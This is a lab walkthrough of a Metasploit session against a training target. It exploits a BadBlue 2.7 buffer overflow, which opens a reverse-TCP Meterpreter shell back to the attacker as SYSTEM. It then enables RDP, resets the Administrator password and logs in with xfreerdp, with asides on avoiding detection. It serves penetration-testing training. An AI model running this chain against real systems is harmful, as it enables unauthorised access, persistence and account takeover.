
# Changing Administrator user password is not recommended as it can directly give him clue of compromise.

*****************************************************************************************************************************************

# Starting metaploit workspace and setting global RHOST

root@attackdefense:~# `service start postgresql && msfconsole`
start: unrecognized service
root@attackdefense:~# `service postgresql start && msfconsole`
Starting PostgreSQL 12 database server: main.
                                                  

  Metasploit Park, System Security Interface
  Version 4.0.5, Alpha E
  Ready...
  > access security
  access: PERMISSION DENIED.
  > access security grid
  access: PERMISSION DENIED.
  > access main security grid
  access: PERMISSION DENIED....and...
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!


       =[ metasploit v5.0.74-dev                          ]
+ -- --=[ 1972 exploits - 1088 auxiliary - 338 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > `workspace -a RDP`
[*] Added workspace: RDP
[*] Workspace: RDP
msf5 > `setg RHOSTS 10.5.28.9`
RHOSTS => 10.5.28.9

# Running NMAP scan on target , we observe that there is no 3389 port which means RDP in this system is disables by default

msf5 > `db_nmap -sV 10.5.28.9`
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-05 11:33 IST
[*] Nmap: Nmap scan report for 10.5.28.9
[*] Nmap: Host is up (0.0023s latency).
[*] Nmap: Not shown: 991 closed ports
[*] Nmap: PORT      STATE SERVICE      VERSION
[*] Nmap: 80/tcp    open  http         BadBlue httpd 2.7
[*] Nmap: 135/tcp   open  msrpc        Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
[*] Nmap: 49152/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49155/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49175/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 60.44 seconds
msf5 > 

# Exploitiung Badblue service

msf5 > `search badblue`

Matching Modules
================

   #  Name                                       Disclosure Date  Rank   Check  Description
   -  ----                                       ---------------  ----   -----  -----------
   0  exploit/windows/http/badblue_ext_overflow  2003-04-20       great  Yes    BadBlue 2.5 EXT.dll Buffer Overflow
   1  exploit/windows/http/badblue_passthru      2007-12-10       great  No     BadBlue 2.72b PassThru Buffer Overflow


msf5 > `use exploit/windows/http/badblue_passthru`
msf5 exploit(windows/http/badblue_passthru) > `options`

Module options (exploit/windows/http/badblue_passthru):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   10.5.28.9        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   BadBlue EE 2.7 Universal


msf5 exploit(windows/http/badblue_passthru) >` set target BadBlue\ EE\ 2.7\ Universal `
target => BadBlue EE 2.7 Universal
msf5 exploit(windows/http/badblue_passthru) > `run`

[*] Started reverse TCP handler on 10.10.26.2:4444 
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (180291 bytes) to 10.5.28.9
[*] Meterpreter session 1 opened (10.10.26.2:4444 -> 10.5.28.9:49267) at 2024-01-05 11:42:50 +0530

meterpreter > `getuid`
Server username: NT AUTHORITY\SYSTEM
meterpreter > `sysinfo`
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x86/windows
meterpreter > 


# We observe that we have highest privilege ie NT Authority and OS is Windows 2012, `lets now enable RDP`

meterpreter > 
Background session 1? [y/N]  
msf5 exploit(windows/http/badblue_passthru) > `enable_rdp`
[-] Unknown command: enable_rdp.
msf5 exploit(windows/http/badblue_passthru) > `search enable_rdp`

Matching Modules
================

   #  Name                            Disclosure Date  Rank    Check  Description
   -  ----                            ---------------  ----    -----  -----------
   0  post/windows/manage/enable_rdp                   normal  No     Windows Manage Enable Remote Desktop


msf5 exploit(windows/http/badblue_passthru) > `use 0`
msf5 post(windows/manage/enable_rdp) >` options`

Module options (post/windows/manage/enable_rdp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   ENABLE    true             no        Enable the RDP Service and Firewall Exception.
   FORWARD   false            no        Forward remote port 3389 to local Port.
   LPORT     3389             no        Local port to forward remote connection.
   PASSWORD                   no        Password for the user created.
   SESSION                    yes       The session to run this module on.
   USERNAME                   no        The username of the user to create.

msf5 post(windows/manage/enable_rdp) > `sessions`

Active sessions
===============

  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ WIN-OMCNBKR66MN  10.10.26.2:4444 -> 10.5.28.9:49267 (10.5.28.9)

msf5 post(windows/manage/enable_rdp) >` set SESSION 1`
SESSION => 1
msf5 post(windows/manage/enable_rdp) >` run`

[*] Enabling Remote Desktop
[*] 	RDP is already enabled
[*] Setting Terminal Services service startup mode
[*] 	The Terminal Services service is not set to auto, changing it to auto ...
[+] 	RDP Service Started
[*] 	Opening port in local firewall if necessary
[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20240105115310_RDP_10.5.28.9_host.windows.cle_819962.txt
[*] Post module execution completed
msf5 post(windows/manage/enable_rdp) > 

# Lets now check if RDP is there, we oberve that now its up and running

msf5 post(windows/manage/enable_rdp) > `db_nmap -p 3389 10.5.28.9`
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-05 11:54 IST
[*] Nmap: Nmap scan report for 10.5.28.9
[*] Nmap: Host is up (0.0023s latency).
[*] Nmap: PORT     STATE SERVICE
[*] Nmap: 3389/tcp open  ms-wbt-server
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds
msf5 post(windows/manage/enable_rdp) > 


# Now we need to get access to RDP, for wchich we require credentials

# We observe that we only have one user ie Administrator, Note that we can create another using `enable_rdp` module 

# But since we already have the NT Authority privilege we can simple change password of Admininstator user, (Note that this is something not recommende because once admin tries to log in he will get to know that the password is changed)

# In case we didnt had NT Authority privilege, we could have used Mimikatz and hash dumping methods then cracking passwords,  or else create user by enable_rdp

msf5 post(windows/manage/enable_rdp) > `sessions 1`
[*] Starting interaction with 1...

meterpreter > `shell`
Process 1340 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>`net users`
net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Guest                    
The command completed with one or more errors.


C:\Windows\system32>

# Changing Administratier user password

C:\Windows\system32>`net user Administrator password_123`
net user Administrator password_123
The command completed successfully.


C:\Windows\system32>

# We can now use `xfreerdp` and get RDP access to the system and interact with it

root@attackdefense:~# `xfreerdp /u:administrator /p:password_123 /v:10.5.28.9`